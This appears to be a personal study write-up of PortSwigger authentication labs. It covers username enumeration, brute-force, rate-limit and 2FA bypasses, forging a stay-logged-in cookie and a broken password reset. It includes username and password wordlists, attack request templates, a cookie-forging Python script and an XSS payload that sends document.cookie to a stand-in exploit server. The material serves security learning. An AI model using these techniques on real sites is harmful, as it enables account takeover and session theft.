## What is the difference between authentication and authorization?

Authentication is the process of verifying that a user is who they claim to be. Authorization involves verifying whether a user is allowed to do something.

For example, authentication determines whether someone attempting to access a website with the username Carlos123 really is the same person who created the account.

Once Carlos123 is authenticated, their permissions determine what they are authorized to do. For example, they may be authorized to access personal information about other users, or perform actions such as deleting another user's account.
## Vulnerabilities in password-based login
### Brute-force attacks

A brute-force attack is when an attacker uses a system of trial and error to guess valid user credentials. These attacks are typically automated using wordlists of usernames and passwords. Automating this process, especially using dedicated tools, potentially enables an attacker to make vast numbers of login attempts at high speed. 

Given wordlist for this series:

> carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover



>123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow


### Lab: Username enumeration via different responses

This lab is vulnerable to username enumeration and password brute-force attacks. 

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 
```
curl -X POST "https://ID.web-security-academy.net/login" \
     -H "Cookie: session=..." \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "username=albuquerque&password=biteme" \
```

### Lab: Username enumeration via subtly different responses

This lab is subtly vulnerable to username enumeration and password brute-force attacks. 

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 
```
curl -X POST "https://ID.web-security-academy.net/login" \
     -H "Cookie: session=..." \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "username=arlington&password=1qaz2wsx" \
```
### Lab: Username enumeration via response timing

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
Your credentials: wiener:peter

- Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.

- Send this request to Burp Intruder and select Pitchfork attack from the attack type drop-down menu. Add the X-Forwarded-For header.

- Add payload positions for the X-Forwarded-For header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it). 

```
POST /login HTTP/2
Host: 0af200310303f7ab805eb29e00af00c6.web-security-academy.net
Cookie: session=Qku3MPwbzG5qk6IxHKc20n9UHjNWvU3w
X-Forwarded-For: §ipv4§

username=§username§&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
### Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

Your credentials: wiener:peter
Victim's username: carlos 

Create text file for rbute password from given file:

`$ for i in {1..100}; do echo "carlos"; echo "carlos"; echo "wiener"; done > labsolveusername.txt`

`$ awk '{print $0} NR % 2 == 0 {print "peter"}' portswigger.password > labsolvepassword.txt`



```
POST /login HTTP/2
Host: ID.web-security-academy.net
Cookie: session=...

username=§wiener§&password=§peter§
```
### Lab: Username enumeration via account lock


This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Repeat login the username list 5 times, and the one that exists in the database will return a different response, in my case, i used Intruder and got the name `applications`:

![alt text](image-17.png)


The password can be find with the same method



### User rate limiting

Another way websites try to prevent brute-force attacks is through user rate limiting. In this case, making too many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:

-    Automatically after a certain period of time has elapsed
-    Manually by an administrator
-    Manually by the user after successfully completing a CAPTCHA

User rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. However, it is still not completely secure. As we saw an example of in an earlier lab, there are several ways an attacker can manipulate their apparent IP in order to bypass the block.

As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request. 

### Lab: Broken brute-force protection, multiple credentials per request


This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

-    Victim's username: carlos

Attempt at login as carlos with a false password uses a json
```
{"username":"carlos","password":"a"}
```
Bruteforce:
```
{
     "username":"carlos",
     "password":[
     "123456",
     "password",
     "12345678",
     "qwerty",
     "123456789",
     "12345",
     .
     .
     .
```

## Vulnerabilities in multi-factor authentication

### Bypassing two-factor authentication

At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.

If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page. 




### Lab: 2FA simple bypass

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

```
GET /my-account?id=carlos HTTP/2
Host: ID.web-security-academy.net
Cookie: session=...
```
### Lab: 2FA broken logic

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

You also have access to the email server to receive your 2FA verification code.

Create the codelist
`seq -w 0001 9999 > numbers`

For fuck's sake I really got a lab that give me the 9997 as the mfa code thats crazy

![alt text](image-18.png)






## Vulnerabilities in other authentication mechanisms

### Keeping users logged in

A common feature is the option to stay logged in even after closing a browser session. This is usually a simple checkbox labeled something like "Remember me" or "Keep me logged in". 
### Lab: Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his My account page.

-    Your credentials: wiener:peter
-    Victim's username: carlos



Examine the cookie and notice that it is Base64-encoded. 

Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:

`base64(username+':'+md5HashOfPassword)`

The script to generate the txt file:
```python
import hashlib
import base64

username = "carlos"
input_file = "password.txt" 
output_file = "base64.md5.txt"

with open(input_file, "r") as infile, open(output_file, "w") as outfile:
    for line in infile:
        password = line.strip()
        md5_hash = hashlib.md5(password.encode()).hexdigest()
        combined = f"{username}:{md5_hash}"
        base64_encoded = base64.b64encode(combined.encode()).decode()
        outfile.write(base64_encoded + "\n")
```

Or we can use Burp Intruder to solve the lab

![alt text](image-19.png)
### Lab: Offline password cracking


This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

XSS payload to get the cookie:
```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```
```
POST /my-account/delete HTTP/2
Host: ID.web-security-academy.net
Cookie: secret=...; stay-logged-in=...; session=...
```
## Resetting user passwords
### Lab: Password reset broken logic


This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

```
POST /forgot-password?temp-forgot-password-token=... HTTP/2
Host: ID.web-security-academy.net
Cookie: session=...


temp-forgot-password-token=...&username=carlos&new-password-1=a&new-password-2=a
```
